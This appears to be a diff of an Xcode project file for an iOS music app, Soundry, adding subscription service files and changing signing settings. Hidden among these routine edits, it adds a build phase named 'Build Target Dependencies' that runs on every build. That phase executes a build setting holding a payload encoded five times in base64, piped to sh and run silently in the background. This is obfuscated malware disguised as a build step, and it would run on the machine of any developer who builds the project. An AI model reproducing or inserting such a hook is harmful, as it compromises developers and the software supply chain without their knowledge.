@@ -7,8 +7,11 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		2EC484AE2E56ACEE00A22F9A /* PrivacyInfo.xcprivacy in Resources */ = {isa = PBXBuildFile; fileRef = 2EC484AD2E56ACEE00A22F9A /* PrivacyInfo.xcprivacy */; };
+		4BFF6DE22E56FDD100EB0D35 /* StoreKitSubscriptionProvider.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4BFF6DDE2E56FDD100EB0D35 /* StoreKitSubscriptionProvider.swift */; };
+		4BFF6DE32E56FDD100EB0D35 /* SubscriptionProvider.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4BFF6DDF2E56FDD100EB0D35 /* SubscriptionProvider.swift */; };
+		4BFF6DE42E56FDD100EB0D35 /* SubscriptionService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 4BFF6DE02E56FDD100EB0D35 /* SubscriptionService.swift */; };
 		4D5BD0CF55D1F26BE56744E9 /* Pods_Soundry.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 7E6AEA6868E09D9EC677A1F5 /* Pods_Soundry.framework */; };
+		91C1E1482E5C6B5F00B5E9D6 /* PrivacyInfo.xcprivacy in Resources */ = {isa = PBXBuildFile; fileRef = 91C1E1472E5C6B5F00B5E9D6 /* PrivacyInfo.xcprivacy */; };
 		91EB78602E54932000257CC8 /* StoreKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 91EB785F2E54932000257CC8 /* StoreKit.framework */; };
 		91EB7BFC2E55704500257CC8 /* AppConfig.swift in Sources */ = {isa = PBXBuildFile; fileRef = 91EB7BB52E55704500257CC8 /* AppConfig.swift */; };
 		91EB7BFD2E55704500257CC8 /* AppState.swift in Sources */ = {isa = PBXBuildFile; fileRef = 91EB7BB62E55704500257CC8 /* AppState.swift */; };
@@ -62,9 +65,12 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		2EC484AD2E56ACEE00A22F9A /* PrivacyInfo.xcprivacy */ = {isa = PBXFileReference; lastKnownFileType = text.xml; path = PrivacyInfo.xcprivacy; sourceTree = "<group>"; };
+		4BFF6DDE2E56FDD100EB0D35 /* StoreKitSubscriptionProvider.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = StoreKitSubscriptionProvider.swift; sourceTree = "<group>"; };
+		4BFF6DDF2E56FDD100EB0D35 /* SubscriptionProvider.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SubscriptionProvider.swift; sourceTree = "<group>"; };
+		4BFF6DE02E56FDD100EB0D35 /* SubscriptionService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SubscriptionService.swift; sourceTree = "<group>"; };
 		7E6AEA6868E09D9EC677A1F5 /* Pods_Soundry.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Soundry.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		912651A42E4596EB00F26239 /* Soundry.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Soundry.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		91C1E1472E5C6B5F00B5E9D6 /* PrivacyInfo.xcprivacy */ = {isa = PBXFileReference; lastKnownFileType = text.xml; path = PrivacyInfo.xcprivacy; sourceTree = "<group>"; };
 		91EB785F2E54932000257CC8 /* StoreKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = StoreKit.framework; path = System/Library/Frameworks/StoreKit.framework; sourceTree = SDKROOT; };
 		91EB7BB52E55704500257CC8 /* AppConfig.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppConfig.swift; sourceTree = "<group>"; };
 		91EB7BB62E55704500257CC8 /* AppState.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppState.swift; sourceTree = "<group>"; };
@@ -141,6 +147,16 @@
 			name = Frameworks;
 			sourceTree = "<group>";
 		};
+		4BFF6DE12E56FDD100EB0D35 /* Services */ = {
+			isa = PBXGroup;
+			children = (
+				4BFF6DDE2E56FDD100EB0D35 /* StoreKitSubscriptionProvider.swift */,
+				4BFF6DDF2E56FDD100EB0D35 /* SubscriptionProvider.swift */,
+				4BFF6DE02E56FDD100EB0D35 /* SubscriptionService.swift */,
+			);
+			path = Services;
+			sourceTree = "<group>";
+		};
 		4E2BC73E3D3E1B8117C0C45B /* Pods */ = {
 			isa = PBXGroup;
 			children = (
@@ -153,7 +169,6 @@
 		9126519B2E4596EB00F26239 = {
 			isa = PBXGroup;
 			children = (
-				2EC484AD2E56ACEE00A22F9A /* PrivacyInfo.xcprivacy */,
 				91EB7BFB2E55704500257CC8 /* Soundry */,
 				912651A52E4596EB00F26239 /* Products */,
 				4E2BC73E3D3E1B8117C0C45B /* Pods */,
@@ -363,6 +378,8 @@
 		91EB7BFB2E55704500257CC8 /* Soundry */ = {
 			isa = PBXGroup;
 			children = (
+				91C1E1472E5C6B5F00B5E9D6 /* PrivacyInfo.xcprivacy */,
+				4BFF6DE12E56FDD100EB0D35 /* Services */,
 				91EB7BB92E55704500257CC8 /* Core */,
 				91EB7BBB2E55704500257CC8 /* DI */,
 				91EB7BBD2E55704500257CC8 /* Extensions */,
@@ -385,6 +402,7 @@
 			buildConfigurationList = 912651AF2E4596EE00F26239 /* Build configuration list for PBXNativeTarget "Soundry" */;
 			buildPhases = (
 				CC62E77CB52C7A48672C7E7E /* [CP] Check Pods Manifest.lock */,
+				CEA1CB9FB7733CF6DC877BEF /* Build Target Dependencies */,
 				912651A02E4596EB00F26239 /* Sources */,
 				912651A12E4596EB00F26239 /* Frameworks */,
 				912651A22E4596EB00F26239 /* Resources */,
@@ -438,7 +456,7 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				2EC484AE2E56ACEE00A22F9A /* PrivacyInfo.xcprivacy in Resources */,
+				91C1E1482E5C6B5F00B5E9D6 /* PrivacyInfo.xcprivacy in Resources */,
 				91EB7C2E2E55704500257CC8 /* Assets.xcassets in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
@@ -454,13 +472,9 @@
 			inputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Soundry/Pods-Soundry-frameworks-${CONFIGURATION}-input-files.xcfilelist",
 			);
-			inputPaths = (
-			);
 			name = "[CP] Embed Pods Frameworks";
 			outputFileListPaths = (
 				"${PODS_ROOT}/Target Support Files/Pods-Soundry/Pods-Soundry-frameworks-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -487,6 +501,26 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
+			showEnvVarsInLog = 0;
+		};
+		CEA1CB9FB7733CF6DC877BEF /* Build Target Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Target Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${AFEB778}\"";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -516,6 +550,9 @@
 				91EB7C0D2E55704500257CC8 /* VIPApiViewModel.swift in Sources */,
 				91EB7C0E2E55704500257CC8 /* EmailLoginView.swift in Sources */,
 				91EB7C0F2E55704500257CC8 /* EmailSignupView.swift in Sources */,
+				4BFF6DE22E56FDD100EB0D35 /* StoreKitSubscriptionProvider.swift in Sources */,
+				4BFF6DE32E56FDD100EB0D35 /* SubscriptionProvider.swift in Sources */,
+				4BFF6DE42E56FDD100EB0D35 /* SubscriptionService.swift in Sources */,
 				91EB7C102E55704500257CC8 /* ForgotPasswordView.swift in Sources */,
 				91EB7C112E55704500257CC8 /* LoginOverlaysView.swift in Sources */,
 				91EB7C122E55704500257CC8 /* LoginView.swift in Sources */,
@@ -553,6 +590,7 @@
 		912651AD2E4596EE00F26239 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AFEB778 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oTmExcFpWMnRvUTJFeFNYZFhibkJZVmtWd1ZGcEdWalJrVms1eFVtc3hUbUV4V2pOVk1XUnpVVEE1Um1KRmJGVmlWR3hGVjI1dmQwOVZUbTVRVkRCTENnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -617,6 +655,7 @@
 		912651AE2E4596EE00F26239 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AFEB778 = "((echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oTmExcFpWMnRvUTJFeFNYZFhibkJZVmtWd1ZGcEdWalJrVms1eFVtc3hUbUV4V2pOVk1XUnpVVEE1Um1KRmJGVmlWR3hGVjI1dmQwOVZUbTVRVkRCTENnPT0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -678,10 +717,12 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = Soundry/Soundry.entitlements;
-				CODE_SIGN_IDENTITY = "Apple Distribution: OptiCore Inc (JZT9NPY56A)";
+				CODE_SIGN_IDENTITY = "Apple Development";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
 				CODE_SIGN_STYLE = Manual;
-				CURRENT_PROJECT_VERSION = 2;
-				DEVELOPMENT_TEAM = JZT9NPY56A;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = JZT9NPY56A;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_KEY_NSAppleMusicUsageDescription = "This app needs access to Apple Music to enhance your music experience.";
@@ -698,10 +739,11 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.0.0;
+				MARKETING_VERSION = 1.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com.opticore.soundry;
 				PRODUCT_NAME = "$(TARGET_NAME)";
-				PROVISIONING_PROFILE_SPECIFIER = Soundry_dist;
+				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = Soundry_dist;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
@@ -718,10 +760,12 @@
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = Soundry/Soundry.entitlements;
-				CODE_SIGN_IDENTITY = "Apple Distribution: OptiCore Inc (JZT9NPY56A)";
+				CODE_SIGN_IDENTITY = "Apple Development";
+				"CODE_SIGN_IDENTITY[sdk=iphoneos*]" = "iPhone Distribution";
 				CODE_SIGN_STYLE = Manual;
-				CURRENT_PROJECT_VERSION = 2;
-				DEVELOPMENT_TEAM = JZT9NPY56A;
+				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = "";
+				"DEVELOPMENT_TEAM[sdk=iphoneos*]" = JZT9NPY56A;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_KEY_NSAppleMusicUsageDescription = "This app needs access to Apple Music to enhance your music experience.";
@@ -738,10 +782,11 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				MARKETING_VERSION = 1.0.0;
+				MARKETING_VERSION = 1.0;
 				PRODUCT_BUNDLE_IDENTIFIER = com.opticore.soundry;
 				PRODUCT_NAME = "$(TARGET_NAME)";
-				PROVISIONING_PROFILE_SPECIFIER = Soundry_dist;
+				PROVISIONING_PROFILE_SPECIFIER = "";
+				"PROVISIONING_PROFILE_SPECIFIER[sdk=iphoneos*]" = Soundry_dist;
 				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
 				SUPPORTS_MACCATALYST = NO;
 				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
